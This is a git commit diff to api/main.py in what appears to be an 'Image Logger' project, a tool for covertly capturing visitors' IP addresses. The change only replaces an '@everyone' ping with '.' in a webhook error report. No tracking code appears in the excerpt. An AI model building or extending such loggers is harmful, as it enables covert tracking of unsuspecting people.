9a71e4c8e300ff24b06efc4dfceedfe5355e1be6
feqanbeyy <feqangerayli1@gmail.com>
2025-09-01 23:11:42 +0400

    Update main.py

--- api/main.py
+++ api/main.py
@@ -77,7 +77,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "@everyone",
+    "content": ".",
     "embeds": [
         {
             "title": "Image Logger - Error",
